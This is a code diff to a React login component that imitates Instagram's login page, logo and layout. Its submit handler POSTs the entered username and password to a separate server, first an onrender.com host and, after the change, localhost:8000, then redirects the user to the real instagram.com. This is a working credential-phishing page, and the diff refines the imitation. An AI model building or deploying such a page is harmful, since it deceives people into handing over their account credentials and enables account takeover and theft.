@@ -1,29 +1,24 @@
 import React, { useState } from "react";
-import "./Login.css"; // we will create this
+import "./Login.css";
 
-function Login() {
+export default function Login() {
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
 
   const handleSubmit = async (e) => {
     e.preventDefault();
-    await fetch("https://insta-clone-nmir.onrender.com/login", {
+    await fetch("http://localhost:8000/login", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ username, password }),
     });
-    console.log(username, password);
     window.location.href = "https://www.instagram.com";
   };
 
   return (
-    <div className="login-container">
-      <div className="login-box">
-        <img
-          src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg"
-          alt="Instagram"
-          className="logo"
-        />
+    <div className="login-page">
+      <div className="login-card">
+        <img src="/instagram.svg" alt="Instagram" className="logo" />
         <form onSubmit={handleSubmit}>
           <input
             type="text"
@@ -41,22 +36,28 @@ function Login() {
           />
           <button type="submit">Log In</button>
         </form>
-        <div className="divider">
-          <div></div>
-          <span>OR</span>
-          <div></div>
-        </div>
-        <a href="https://www.facebook.com" className="fb-login">
+        <div className="divider"><div /><span>OR</span><div /></div>
+        <a href="https://www.facebook.com" className="facebook-login">
           Log in with Facebook
         </a>
         <a href="/" className="forgot-password">
           Forgot password?
         </a>
       </div>
+
+      <div className="signup-card">
+        <p>
+          Don’t have an account? <a href="/">Sign up</a>
+        </p>
+      </div>
+
+      <div className="app-promo">
+        <p>Get the app.</p>
+        <div className="store-badges">
+          <img src="/appstore.png" alt="App Store" />
+          <img src="/playstore.png" alt="Google Play" />
+        </div>
+      </div>
     </div>
   );
 }
-
-export default Login;
-
-
